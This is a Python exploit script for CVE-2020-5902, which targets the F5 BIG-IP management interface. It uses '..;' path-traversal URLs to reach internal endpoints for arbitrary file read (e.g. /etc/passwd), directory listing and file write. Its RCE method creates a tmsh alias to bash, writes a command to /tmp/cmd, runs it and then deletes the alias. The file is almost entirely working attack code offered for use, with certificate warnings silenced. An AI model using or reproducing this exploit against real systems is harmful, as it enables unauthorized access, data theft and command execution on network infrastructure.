class Scan:
	def __init__(self, Protocol, Host, Port, BasePath=''):
		self.requests = __import__('requests')
		self.warnings = __import__('warnings')
		self.warnings.filterwarnings('ignore', message='Unverified HTTPS request')
		self.colorama = __import__('colorama')
		self.colorama.init(autoreset=True)
		self.Protocol = Protocol
		self.Host = Host
		self.Port = Port
		self.BasePath = BasePath
		self.TARGET = '{Protocol}://{Host}:{Port}{BasePath}'.format(Protocol=Protocol, Host=Host, Port=Port, BasePath=BasePath)
		self.PAYLOAD = [
			'{TARGET}/tmui/login.jsp/..;{ENDPOINT}',
			'{TARGET}/tmui/tmui/login/welcome.jsp/..;/..;/..;{ENDPOINT}',
			'{TARGET}/tmui/tmui/login/legal.html/..;/..;/..;{ENDPOINT}'
		]
		print('Scanning CVE-2020-5902...\n')



	'''
		/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
	'''
	def fileRead(self, fileName, ShowOutput=True):
		isSuccess = False
		content = ''
		ENDPOINT = '/tmui/locallb/workspace/fileRead.jsp?fileName={fileName}'.format(fileName=fileName)

		for url in self.PAYLOAD:
			url = url.format(TARGET=self.TARGET, ENDPOINT=ENDPOINT)
			res = self.requests.get(url, verify=False, allow_redirects=False)
			if res.status_code == 200:
				try:
					if 'output' in res.json():
						isSuccess = True
						content = res.json()['output']
						if ShowOutput: print(self.colorama.Back.BLUE + '[+] ' + url)
						if ShowOutput: print(self.colorama.Fore.RED + '=========================================================================')
						if ShowOutput: print(self.colorama.Back.RED + '==> CVE-2020-5902 (fileRead.jsp) - BEGIN')
						if ShowOutput: print(self.colorama.Fore.RED + '=========================================================================')
						if ShowOutput: print(fileName)
						if ShowOutput: print(self.colorama.Fore.YELLOW + content)
						if ShowOutput: print(self.colorama.Fore.RED + '=========================================================================')
						if ShowOutput: print(self.colorama.Back.RED + '==> CVE-2020-5902 (fileRead.jsp) - END')
						if ShowOutput: print(self.colorama.Fore.RED + '=========================================================================')
					else:
						if ShowOutput: print(self.colorama.Fore.RED + '[-] ' + url + " => " + str(res.status_code))
				except Exception as e:
					if ShowOutput: print(self.colorama.Fore.RED + '[-] ' + url + " => " + str(res.status_code))
			else:
				if ShowOutput: print(self.colorama.Fore.RED + '[-] ' + url + " => " + str(res.status_code))

			if isSuccess: break

		if ShowOutput: print('')

		return {
			'isSuccess': isSuccess,
			'content': content
		}



	'''
		/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/www/
	'''
	def directoryList(self, directoryPath, ShowOutput=True):
		isSuccess = False
		content = ''
		ENDPOINT = '/tmui/locallb/workspace/directoryList.jsp?directoryPath={directoryPath}'.format(directoryPath=directoryPath)

		for url in self.PAYLOAD:
			url = url.format(TARGET=self.TARGET, ENDPOINT=ENDPOINT)
			res = self.requests.get(url, verify=False, allow_redirects=False)
			if res.status_code == 200:
				try:
					if 'output' in res.json():
						isSuccess = True
						content = res.json()['output']
						if ShowOutput: print(self.colorama.Back.BLUE + '[+] ' + url)
						if ShowOutput: print(self.colorama.Fore.RED + '=========================================================================')
						if ShowOutput: print(self.colorama.Back.RED + '==> CVE-2020-5902 (directoryList.jsp) - BEGIN')
						if ShowOutput: print(self.colorama.Fore.RED + '=========================================================================')
						if ShowOutput: print(directoryPath)
						if ShowOutput: print(self.colorama.Fore.YELLOW + str(content))
						if ShowOutput: print(self.colorama.Fore.RED + '=========================================================================')
						if ShowOutput: print(self.colorama.Back.RED + '==> CVE-2020-5902 (directoryList.jsp) - END')
						if ShowOutput: print(self.colorama.Fore.RED + '=========================================================================')
					else:
						if ShowOutput: print(self.coloramaFore.RED + '[-] ' + url + " => " + str(res.status_code))
				except Exception as e:
					if ShowOutput: print(self.coloramaFore.RED + '[-] ' + url + " => " + str(res.status_code))
			else:
				if ShowOutput: print(self.colorama.Fore.RED + '[-] ' + url + " => " + str(res.status_code))

			if isSuccess: break

		if ShowOutput: print('')

		return {
			'isSuccess': isSuccess,
			'content': content
		}



	'''
		/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp
	'''
	def fileSave(self, fileName, content, ShowOutput=True):
		isSuccess = False
		ENDPOINT = '/tmui/locallb/workspace/fileSave.jsp'

		for url in self.PAYLOAD:
			url = url.format(TARGET=self.TARGET, ENDPOINT=ENDPOINT)
			res = self.requests.post(url, data={'fileName': fileName, 'content': content}, verify=False, allow_redirects=False)
			if res.status_code == 200:
				fR = self.fileRead(fileName, False)
				if fR['isSuccess'] and fR['content'][:-1] == content:
					isSuccess = True
					if ShowOutput: print(self.colorama.Back.BLUE + '[+] ' + url)
				else:
					if ShowOutput: print(self.colorama.Fore.RED + '[-] ' + url + " => " + str(res.status_code))
			else:
				if ShowOutput: print(self.colorama.Fore.RED + '[-] ' + url + " => " + str(res.status_code))

			if isSuccess: break

		return isSuccess



	'''
		/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash
		/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id
		/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd
		/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list
	'''
	def RCE(self, command, ShowOutput=True):
		isSuccess = False
		content = ''
		# Create CLI alias private list command bash
		ENDPOINT1 = '/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash'
		# Run bash shell
		ENDPOINT2 = '/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd'
		# Delete CLI alias private list
		ENDPOINT3 = '/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list'

		for url in self.PAYLOAD:
			url1 = url.format(TARGET=self.TARGET, ENDPOINT=ENDPOINT1)
			res = self.requests.get(url1, verify=False, allow_redirects=False)
			if res.status_code == 200:
				try:
					if 'error' in res.json() and 'output' in res.json():
						if ShowOutput: print(self.colorama.Back.BLUE + '[+] ' + url1)
						if self.fileSave('/tmp/cmd', command):
							for url in self.PAYLOAD:
								url2 = url.format(TARGET=self.TARGET, ENDPOINT=ENDPOINT2)
								res = self.requests.get(url2, verify=False, allow_redirects=False)
								if res.status_code == 200:
									try:
										if 'error' in res.json() and 'output' in res.json():
											if res.json()['output'] != '':
												isSuccess = True
												content = res.json()['output']
												if ShowOutput: print(self.colorama.Back.BLUE + '[+] ' + url2)
												if ShowOutput: print(self.colorama.Fore.RED + '=========================================================================')
												if ShowOutput: print(self.colorama.Back.RED + '==> CVE-2020-5902 (tmshCmd.jsp) - BEGIN')
												if ShowOutput: print(self.colorama.Fore.RED + '=========================================================================')
												if ShowOutput: print(command)
												if ShowOutput: print(self.colorama.Fore.YELLOW + content)
												if ShowOutput: print(self.colorama.Fore.RED + '=========================================================================')
												if ShowOutput: print(self.colorama.Back.RED + '==> CVE-2020-5902 (tmshCmd.jsp) - END')
												if ShowOutput: print(self.colorama.Fore.RED + '=========================================================================')
											else:
												if ShowOutput: print(self.colorama.Fore.RED + '[-] ' + url2 + " => " + str(res.status_code))
												print(res.json())
									except Exception as e:
										if ShowOutput: print(self.colorama.Fore.RED + '[-] ' + url2 + " => " + str(res.status_code))
								else:
									if ShowOutput: print(self.colorama.Fore.RED + '[-] ' + url2 + " => " + str(res.status_code))

								if isSuccess: break
						else:
							break
				except Exception as e:
					if ShowOutput: print(self.colorama.Fore.RED + '[-] ' + url1 + " => " + str(res.status_code))
			else:
				if ShowOutput: print(self.colorama.Fore.RED + '[-] ' + url1 + " => " + str(res.status_code))

			if isSuccess: break


		for url in self.PAYLOAD:
			url3 = url.format(TARGET=self.TARGET, ENDPOINT=ENDPOINT3)
			res = self.requests.get(url3, verify=False, allow_redirects=False)
			if res.status_code == 200:
				try:
					if 'error' in res.json() and 'output' in res.json():
						if ShowOutput: print(self.colorama.Back.BLUE + '[+] ' + url3)
						break
				except Exception as e:
					if ShowOutput: print(self.colorama.Fore.RED + '[-] ' + url3 + " => " + str(res.status_code))
			else:
				if ShowOutput: print(self.colorama.Fore.RED + '[-] ' + url3 + " => " + str(res.status_code))

		if not isSuccess:
			if ShowOutput: print("\nUnable RCE")
		
		if ShowOutput: print('')

		return {
			'isSuccess': isSuccess,
			'content': content
		}